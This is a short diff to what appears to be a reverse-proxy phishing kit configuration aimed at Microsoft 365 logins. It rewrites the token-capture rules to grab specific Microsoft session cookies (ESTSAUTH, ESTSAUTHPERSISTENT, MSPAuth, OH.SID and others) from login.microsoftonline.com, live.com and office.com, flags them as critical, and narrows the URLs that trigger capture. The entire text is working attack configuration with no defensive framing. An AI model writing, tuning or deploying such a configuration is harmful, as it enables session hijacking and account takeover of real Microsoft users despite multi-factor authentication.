@@ -64,19 +64,25 @@ sub_filters:
 
 
 auth_tokens:
-  - domain: '.login.live.com'
-    keys: ['MSPOK','.*,regexp']
-  - domain: '.live.com'
-    keys: ['.*,regexp']
-  - domain: '.microsoft.com'
-    keys: ['.*,regexp']
-  - domain: '.account.microsoft.com'
-    keys: ['.*,regexp']      
+  # Primary Microsoft session cookies (CRITICAL!)
+  - domain: ".login.microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT"]
+    search: "(.*)"
+  
+  # Live.com session cookies
+  - domain: ".live.com"
+    keys: ["MSRPS", "MSPOK", "MSPRequ", "uaid", "MSPAuth", "MSPProf"]
+    search: "(.*)"
+  
+  # Office.com cookies
+  - domain: ".office.com"
+    keys: ["OH.SID"]
+    search: "(.*)"    
+    
 auth_urls:
-  - '/'
-  - '/*'  
-  - '/auth'
-  - '/auth/*'
+  - '^https://m365\.{hostname}/$'
+  - '^https://www\.{hostname}/$'
+  
 credentials:
   username:
     key: 'login'
